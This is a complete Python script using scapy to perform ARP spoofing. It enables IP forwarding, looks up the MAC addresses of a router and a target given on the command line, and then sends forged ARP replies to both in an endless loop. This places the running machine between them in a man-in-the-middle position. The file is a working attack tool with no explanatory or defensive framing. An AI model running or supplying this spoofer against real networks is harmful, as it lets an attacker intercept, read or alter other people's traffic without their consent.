#!/bin/python

import scapy.all as scapy
import sys
import time
import os

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def get_mac_address(ip_address):
	brodcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_layer = scapy.ARP(pdst=ip_address)
	get_mac_packet = brodcast_layer/arp_layer
	answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
	return answer[0][1].hwsrc


def spoof(router_ip, target_ip, router_mac, target_mac):
	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
	scapy.send(packet1)
	scapy.send(packet2)


target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))


try:
	while True:
		spoof(router_ip, target_ip, router_mac, target_mac)

except KeyboardInterrupt:
	print('closing arp spoofer')
	exit(0)
